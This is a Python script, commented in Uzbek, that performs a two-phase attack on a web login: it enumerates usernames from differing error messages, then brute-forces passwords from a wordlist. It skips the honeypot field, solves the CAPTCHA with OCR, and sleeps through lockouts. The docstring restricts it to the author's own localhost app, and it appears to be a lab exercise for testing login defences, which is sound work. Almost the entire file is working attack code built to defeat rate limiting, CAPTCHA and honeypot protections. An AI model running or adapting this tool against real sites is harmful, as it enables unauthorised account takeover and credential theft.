"""
v5 (yangilangan) — Ikki fazali elita hujum:
  FAZA 1: Username enumeration — server xato xabaridan foydalanib username'ni topadi
  FAZA 2: Parol brute-force — topilgan username bilan parolni sinaydi
           (honeypot chetlab o'tiladi, CAPTCHA OCR bilan yechiladi, bloklanish kutiladi)

FAQAT localhost'dagi o'z ilovangizga (app_v6.py) qarshi ishlatish uchun.
"""
import io
import re
import sys
import time
import requests
from PIL import Image
import pytesseract

TARGET_URL  = "http://127.0.0.1:5004/"
WORDLIST    = "wordlist_v5.txt"

# Username ro'yxati — admin birinchi, darhol topiladi
USERNAMES = [
    "admin", "administrator", "root", "user",
    "test", "guest", "superuser", "securevault",
]

LOCK_PATTERNS = [
    re.compile(r"(\d+)\s*soniyadan keyin"),
    re.compile(r"(\d+)\s*soniyaga bloklandi"),
]
PERMANENT_MARKERS = ["xavfsizlik siyosati", "Hisobingiz bloklandi."]

# ── yordamchi funksiyalar ──────────────────────────────────────────────────

def load_wordlist(path):
    with open(path) as f:
        return [l.strip() for l in f if l.strip()]

def needs_captcha(html):
    return 'name="captcha"' in html

def captcha_was_wrong(html):
    return "CAPTCHA noto" in html

def is_permanent(html):
    return any(m in html for m in PERMANENT_MARKERS)

def extract_wait(html):
    for p in LOCK_PATTERNS:
        m = p.search(html)
        if m:
            return int(m.group(1))
    return None

def solve_captcha(sess):
    resp = sess.get(TARGET_URL + "captcha.png")
    img  = Image.open(io.BytesIO(resp.content)).convert("L")
    w, h = img.size
    img  = img.resize((w * 3, h * 3), Image.LANCZOS)
    cfg  = "--psm 7 -c tessedit_char_whitelist=23456789"
    raw  = pytesseract.image_to_string(img, config=cfg)
    return "".join(ch for ch in raw if ch in "23456789")

def post(sess, username, password, captcha=None):
    data = {"username": username, "password": password}
    if captcha is not None:
        data["captcha"] = captcha
    # honeypot maydoni ATAYLAB yuborilmaydi
    return sess.post(TARGET_URL, data=data, allow_redirects=False)

def is_success(resp):
    return resp.status_code in (301,302,303,307,308) or \
           "Muvaffaqiyatli" in resp.text or \
           "dashboard" in resp.text.lower()

def username_exists(html):
    # "Bunday foydalanuvchi topilmadi" = yo'q; boshqa xabar = bor
    return "Bunday foydalanuvchi topilmadi" not in html

# ── 1-FAZA: username topish ───────────────────────────────────────────────

def phase1_find_username(sess):
    print("=" * 55)
    print("  1-FAZA: USERNAME ENUMERATION")
    print("=" * 55)
    html = sess.get(TARGET_URL).text

    for uname in USERNAMES:
        cap_val = None
        if needs_captcha(html):
            cap_val = solve_captcha(sess)
            print(f"  [CAPTCHA -> OCR: {cap_val!r}]")

        resp = post(sess, uname, "wrong_pass_x7k", cap_val)
        html = resp.text if resp.status_code not in (301,302,303,307,308) else ""

        if captcha_was_wrong(html):
            print(f"  [{uname}] CAPTCHA xato, qayta...")
            html = sess.get(TARGET_URL).text
            continue

        wait = extract_wait(html)
        if wait:
            print(f"  [{uname}] bloklandi, {wait}s kutilmoqda...")
            time.sleep(wait + 1)
            html = sess.get(TARGET_URL).text
            continue

        if username_exists(html):
            print(f"  [{uname}] -> TOPILDI! ✓")
            print()
            return uname
        else:
            print(f"  [{uname}] -> yo'q")

    print("\n  Username topilmadi!")
    sys.exit(1)

# ── 2-FAZA: parol topish ─────────────────────────────────────────────────

def phase2_find_password(sess, username, passwords):
    print("=" * 55)
    print(f"  2-FAZA: PAROL BRUTE-FORCE  (user: {username})")
    print("=" * 55)

    total          = len(passwords)
    total_waited   = 0.0
    lockouts       = 0
    captchas       = 0
    html           = sess.get(TARGET_URL).text

    idx = 0
    while idx < total:
        pwd = passwords[idx]

        cap_val = None
        if needs_captcha(html):
            cap_val = solve_captcha(sess)
            captchas += 1
            print(f"      [CAPTCHA -> OCR: {cap_val!r}]")

        resp = post(sess, username, pwd, cap_val)
        html = resp.text if resp.status_code not in (301,302,303,307,308) else ""

        if is_success(resp):
            print(f"  [{idx+1}/{total}] {pwd!r} -> TOPILDI! ✓")
            return pwd, total_waited, lockouts, captchas

        if is_permanent(html):
            print(f"  [{idx+1}/{total}] {pwd!r} -> DOIMIY BLOKLANDI")
            return None, total_waited, lockouts, captchas

        if captcha_was_wrong(html):
            print(f"  [{idx+1}/{total}] {pwd!r} -> CAPTCHA xato, qayta...")
            html = sess.get(TARGET_URL).text
            continue

        wait = extract_wait(html)
        if wait:
            lockouts += 1
            print(f"  [{idx+1}/{total}] {pwd!r} -> bloklandi, {wait}s kutilmoqda... (#{lockouts})")
            time.sleep(wait + 1)
            total_waited += wait + 1
            html = sess.get(TARGET_URL).text
            continue

        print(f"  [{idx+1}/{total}] {pwd!r} -> xato")
        idx += 1

    return None, total_waited, lockouts, captchas

# ── ASOSIY ────────────────────────────────────────────────────────────────

def main():
    print()
    print("  ███████╗██╗     ██╗████████╗ █████╗ ")
    print("  ██╔════╝██║     ██║╚══██╔══╝██╔══██╗")
    print("  █████╗  ██║     ██║   ██║   ███████║")
    print("  ██╔══╝  ██║     ██║   ██║   ██╔══██║")
    print("  ███████╗███████╗██║   ██║   ██║  ██║")
    print("  ╚══════╝╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝")
    print(f"  Nishon: {TARGET_URL}")
    print()

    passwords = load_wordlist(WORDLIST)
    sess = requests.Session()

    t0 = time.time()

    username = phase1_find_username(sess)
    pwd, waited, lockouts, captchas = phase2_find_password(sess, username, passwords)

    elapsed = time.time() - t0
    print()
    print("=" * 55)
    if pwd:
        print(f"  [+] USERNAME : {username}")
        print(f"  [+] PAROL    : {pwd}")
        print(f"  [+] Jami vaqt: {elapsed:.0f}s | bloklanish: {lockouts} | CAPTCHA: {captchas}")
    else:
        print("  [-] Parol topilmadi")
    print("=" * 55)

if __name__ == "__main__":
    main()
